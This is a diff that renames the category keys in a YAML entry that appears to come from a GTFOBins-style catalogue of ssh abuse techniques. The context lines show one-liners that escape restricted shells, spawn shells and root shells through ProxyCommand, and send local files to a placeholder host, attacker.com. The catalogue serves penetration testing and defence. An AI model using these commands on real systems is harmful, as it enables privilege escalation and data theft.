@@ -1,18 +1,18 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - description: Reconnecting may help bypassing restricted shells.
       code: ssh localhost $SHELL --noprofile --norc
     - description: Spawn interactive shell through ProxyCommand option.
       code: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-  upload:
+  file-upload:
     - description: Send local file to a SSH server.
       code: |
         HOST=user@attacker.com
         RPATH=file_to_save
         LPATH=file_to_send
         ssh $HOST "cat > $RPATH" < $LPATH
-  download:
+  file-download:
     - description: Fetch a remote file from a SSH server.
       code: |
         HOST=user@attacker.com
@@ -24,7 +24,7 @@ functions:
       code: |
         LFILE=file_to_read
         ssh -F $LFILE localhost
-  sudo-enabled:
+  sudo:
     - description: Spawn interactive root shell through ProxyCommand option.
       code: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ---
